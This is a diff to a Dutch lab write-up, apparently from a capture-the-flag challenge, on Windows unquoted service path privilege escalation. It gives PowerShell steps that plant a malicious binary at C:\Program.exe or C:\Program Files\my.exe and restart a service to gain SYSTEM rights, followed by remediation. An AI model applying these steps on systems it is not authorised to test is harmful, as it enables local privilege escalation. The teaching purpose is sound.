@@ -132,32 +132,51 @@ Get-CimInstance Win32_Service | Where-Object { $_.State -eq "Running" -and $_.Pa
 
 ## 5. Vulnerability Deep Dive: Unquoted Service Paths
 
-Een **Unquoted Service Path** is een kwetsbaarheid waarbij het pad naar de executable van een service spaties bevat, maar niet tussen aanhalingstekens (`" "`) staat in de configuratie.
+Een **Unquoted Service Path** is een kwetsbaarheid waarbij het binaire pad van een service spaties bevat, maar niet tussen aanhalingstekens (`" "`) staat in de configuratie (`ImagePath` in het register).
 
-### Hoe het besturingssysteem paden interpreteert
-Wanneer Windows een service aanroept, probeert de subsystem-parser het pad te ontleden. Als er geen aanhalingstekens om het pad staan, splitst de parser het pad bij **elke spatie** en interpreteert het linkerdeel als een executable en het rechterdeel als argumenten.
+### Waarom ontstaat deze kwetsbaarheid? (De Windows Path Parser)
+In Windows Command-subsystemen scheidt een spatie traditioneel een programmanaam van zijn argumenten (bijvoorbeeld `ping 192.168.1.1`).
 
-Stel dat een service als volgt is geconfigureerd:
+Wanneer Windows een service start waarvan het pad **geen** aanhalingstekens bevat, ontleedt de parser het pad van links naar rechts. Bij **iedere spatie** die Windows tegenkomt, pauzeert het subsysteem en controleert het of de tekst vóór de spatie toevallig overeenkomt met een bestaand uitvoerbaar bestand (`.exe`).
+
+Beschouw het pad uit het lab:
 <pre>
 C:\Program Files\my service\WindowsService1.exe
 </pre>
 
-Windows zoekt tijdens het starten van de service achtereenvolgens naar de volgende bestanden op de schijf:
+Dit pad bevat exact **twee spaties**. Windows evalueert het pad daardoor in een vaste volgorde:
 
-1. `C:\Program.exe` (met argument: `Files\my service\WindowsService1.exe`)
-2. `C:\Program Files\my.exe` (met argument: `service\WindowsService1.exe`)
-3. `C:\Program Files\my service\WindowsService1.exe` (het beoogde bestand)
+<pre>
+1. Eerste spatie:  [C:\Program] [Files\my service\WindowsService1.exe]
+   -> Windows controleert: Bestaat het bestand "C:\Program.exe"?
+      - Zo ja: Windows voert C:\Program.exe uit (met de rest als argumenten).
+      - Zo nee: Windows gaat door naar de volgende spatie.
 
-### Exploitation Scenario (Local Privilege Escalation)
-Indien een kwaadwillende gebruiker schrijfrechten heeft op de root van de systeemschijf (`C:\`) of in de map `C:\Program Files\`:
+2. Tweede spatie:  [C:\Program Files\my] [service\WindowsService1.exe]
+   -> Windows controleert: Bestaat het bestand "C:\Program Files\my.exe"?
+      - Zo ja: Windows voert "C:\Program Files\my.exe" uit.
+      - Zo nee: Windows gaat door naar het einde van het pad.
 
-1. De aanvaller plaatst een kwaadaardige binary met de naam `C:\Program.exe`.
-2. Zodra de service herstart (of het systeem herstart), start Windows `C:\Program.exe` in plaats van de legitieme applicatie.
-3. Omdat services veelal draaien onder `LocalSystem`, wordt de code van de aanvaller direct uitgevoerd met de hoogste privileges op het systeem.
+3. Einde van pad:  [C:\Program Files\my service\WindowsService1.exe]
+   -> Pas als beide eerdere bestanden NIET bestaan, wordt de legitieme binary gestart.
+</pre>
+
+### Hoe bepaal je alle mogelijke aanvalsvectoren?
+Je telt simpelweg het aantal spaties in het ongeciteerde pad van links naar rechts:
+* Iedere spatie representeert een potentiële bestandsnaam die gekaapt kan worden.
+* Omdat ons pad twee spaties telt, zijn er exact twee unieke exploit-methodes:
+  * **Methode 1 (Eerste spatie):** Payload plaatsen als `C:\Program.exe`
+  * **Methode 2 (Tweede spatie):** Payload plaatsen als `C:\Program Files\my.exe`
+
+### Het Security Risico: Local Privilege Escalation (LPE)
+Als een service draait onder `LocalSystem` en een aanvaller heeft schrijfrechten op `C:\` of `C:\Program Files\`:
+1. De aanvaller plaatst een kwaadaardige binary op een van de tussenliggende paden (`C:\Program.exe` of `C:\Program Files\my.exe`).
+2. Bij het herstarten van de service of de machine pakt de Service Control Manager automatisch het kwaadaardige bestand.
+3. De code van de aanvaller draait nu direct met `SYSTEM`-privileges.
 
 ---
 
-## 6. Lab Walkthrough: Reproduceren & Exploiteren
+## 6. Lab Walkthrough: Beide Exploitatiemethodes Uitvoeren
 
 ### Stap 1: Controleren op kwetsbare services via CMD / WMIC
 In een command prompt (`cmd.exe`) wordt gezocht naar kwetsbare auto-start services:
@@ -191,54 +210,63 @@ New-Item -Path "C:\Program Files\my service" -ItemType Directory -Force
 # De originele binary kopiëren
 Copy-Item -Path ".\WindowsService1.exe" -Destination "C:\Program Files\my service\"
 
-# De service aanmaken
+# De service aanmaken (de quotes worden niet in de registry-waarde opgeslagen)
 New-Service -Name "MyService" -BinaryPathName "C:\Program Files\my service\WindowsService1.exe"
 </pre>
 
-*Belangrijk detail:* Hoewel de parameter `-BinaryPathName` in PowerShell tussen quotes wordt gezet om de spatie in de commandline te verwerken, slaat Windows de string in het register **zonder** quotes op:
-`C:\Program Files\my service\WindowsService1.exe`.
-
----
-
-### Stap 3: Verifiëren van de initiële uitvoering
-Start de service en inspecteer het Application Log in de Event Viewer (`eventvwr.msc`):
+Start de service en verifieer de normale werking in de Event Viewer (`eventvwr.msc` onder **Application** met Source `SimpleService` en Event ID `0`):
 
 <pre>
-# Starten van de service
 Start-Service -Name "MyService"
-
-# Controleren van de status
 Get-Service -Name "MyService"
 </pre>
 
-In de Event Viewer onder **Windows Logs > Application** verschijnen gebeurtenissen met:
-* **Event ID:** `0`
-* **Source:** `SimpleService`
-* **Message:** De reguliere notificatie afkomstig van `WindowsService1.exe`.
-
 ---
 
-### Stap 4: De exploitatie uitvoeren
-De aanvaller misbruikt de eerste spatie na `C:\Program`:
+### Stap 3: Methode 1 Exploiteren (`C:\Program.exe`)
+Hierbij richten we ons op de **eerste spatie** in `C:\Program Files\`:
 
 <pre>
-# Kopieer de kwaadaardige service binary naar de root als Program.exe
-Copy-Item -Path ".\EvilWindowsService.exe" -Destination "C:\Program.exe"
+# Kopieer de kwaadaardige binary als Program.exe direct naar de root C:\
+Copy-Item -Path "C:\Users\cybrary\Desktop\EvilWindowsService.exe" -Destination "C:\Program.exe"
 
-# Herstart de service
+# Herstart de service om de exploit te activeren
 Stop-Service -Name "MyService"
 Start-Service -Name "MyService"
 </pre>
 
-Wanneer `Start-Service` wordt aangeroepen, detecteert Windows het bestand `C:\Program.exe` en voert dit uit met de rechten van de service.
+Controleer in Event Viewer: de nieuwe entries met Event ID `0` zijn nu afkomstig van de kwaadaardige service.
 
-Bij een refresh in de Event Viewer tonen de nieuwe logregels met Event ID `0` en Source `SimpleService` nu het afwijkende bericht dat afkomstig is van `EvilWindowsService.exe`.
+---
+
+### Stap 4: Methode 2 Exploiteren (`C:\Program Files\my.exe`)
+Nu richten we ons op de **tweede spatie** in `my service`. 
+
+*Belangrijke voorwaarde:* Omdat Windows van links naar rechts zoekt, moet `C:\Program.exe` eerst verwijderd worden, anders krijgt die altijd voorrang op latere spaties.
+
+<pre>
+# 1. Eerst de payload van methode 1 opruimen
+Remove-Item -Path "C:\Program.exe" -Force -ErrorAction SilentlyContinue
+
+# 2. De kwaadaardige binary kopiëren als my.exe in C:\Program Files\
+Copy-Item -Path "C:\Users\cybrary\Desktop\EvilWindowsService.exe" -Destination "C:\Program Files\my.exe"
+
+# 3. De service herstarten
+Stop-Service -Name "MyService"
+Start-Service -Name "MyService"
+
+# 4. Naar de Desktop navigeren en het challenge-script uitvoeren om de flag op te halen
+Set-Location -Path "C:\Users\cybrary\Desktop"
+.\Flag.bat
+</pre>
+
+Windows ziet nu dat `C:\Program.exe` ontbreekt, zoekt verder naar de volgende spatie, vindt `C:\Program Files\my.exe` en start deze met `SYSTEM`-rechten, waardoor de challenge succesvol wordt gevalideerd.
 
 ---
 
 ## 7. Remediation & Hardening
 
-Om Unquoted Service Paths structureel te verhelpen, moet het pad in het Windows Register worden geciteerd.
+Om Unquoted Service Paths structureel te verhelpen, moet het pad in het Windows Register worden geciteerd met dubbele aanhalingstekens.
 
 ### Registersleutel locatie
 Alle services bevinden zich in het register onder:
